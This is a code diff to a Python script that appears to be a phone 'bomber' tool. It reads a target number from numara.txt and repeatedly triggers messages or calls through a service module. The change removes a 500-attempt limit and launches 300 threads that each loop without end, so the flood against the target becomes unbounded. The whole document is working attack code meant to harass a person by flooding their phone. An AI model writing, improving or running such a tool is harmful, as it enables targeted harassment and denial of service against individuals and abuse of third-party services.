@@ -1,23 +1,27 @@
 import sys, os
 from StructService import Distribution_Service
-from config import attack
+from threading import Thread
 from colorama import Fore
+attack_number_phone = Distribution_Service()
 
-attack_number_phone=Distribution_Service()
+def start(phone):
+	attack_number_phone.phone(phone)
+
+	while True:
+		try:
+			attack_number_phone.random_service()
+		except Exception as ex:
+			print(ex)
+
+file = open ("numara.txt", 'r')
+phone = file.read()
+
 try:
-    attack_number_phone.phone('+905333333333')
-except Exception as error:
-    print(f'Phone - +905555555555')
-    sys.exit()
+	attack_number_phone.phone(phone)
+except:
+	print(Fore.RED + 'НATALI NUMARA GİRİLDİ')
+	sys.exit()
 
-while True:
-    try:
-        attack_number_phone.random_service()
-        attack += 1
-        print(f"{Fore.GREEN}+-+-+-+-+-+-+-+-+-+->> {Fore.RED}[[ {Fore.YELLOW}SenDinNG {Fore.RED}]]{Fore.RESET}")
-        if attack == 500:
-            sys.exit()
-    except Exception:
-        pass
-
-#
+for i in range(300):
+    th = Thread(target=start, args=(phone, ))
+    th.start()
